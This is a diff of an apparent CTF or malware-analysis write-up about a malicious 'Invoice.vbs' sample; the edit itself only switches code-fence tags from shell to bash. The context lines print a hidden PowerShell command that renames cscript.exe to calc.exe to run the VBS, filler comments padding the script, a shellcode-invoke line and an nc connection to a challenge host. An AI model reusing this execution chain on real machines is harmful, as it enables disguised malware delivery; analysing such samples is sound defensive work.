@@ -17,7 +17,7 @@ After the last site UNZ used to rely on for the majority of Vitalium mining ran 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe a-Nop -sta -noni -w hidden -c cp C:\Windows\System32\cscript.exe .\calc.exe;.\calc.exe Invoice.vbs3C:\Program Files\Windows NT\Accessories\wordpad.exe
 ```
 
-```shell title="invoice.vbs"
+```bash title="invoice.vbs"
     REM While VBA might seem daunting to beginners, numerous resources are available to help users get started. Microsoft provides comprehensive documentation, tutorials, and a vibrant community of users sharing their knowledge and solutions. Online forums, blogs, and video tutorials offer practical examples and guidance for leveraging VBA in Microsoft Office applications. Additionally, recording and modifying macros is an excellent starting point for understanding VBA code and automating repetitive tasks.
 
     REM The great power of VBA programming in Office is that nearly every operation that you can perform with a mouse, keyboard, or a dialog box can also be automated by using VBA. Further, if it can be done once with VBA, it can be done just as easily a hundred times. In fact, the automation of repetitive tasks is one of the most common uses of VBA in Office.
@@ -117,7 +117,7 @@ $var_runme.Invoke([IntPtr]::Zero)
 
 ## 连接容器
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ nc 94.237.59.102 57005
 
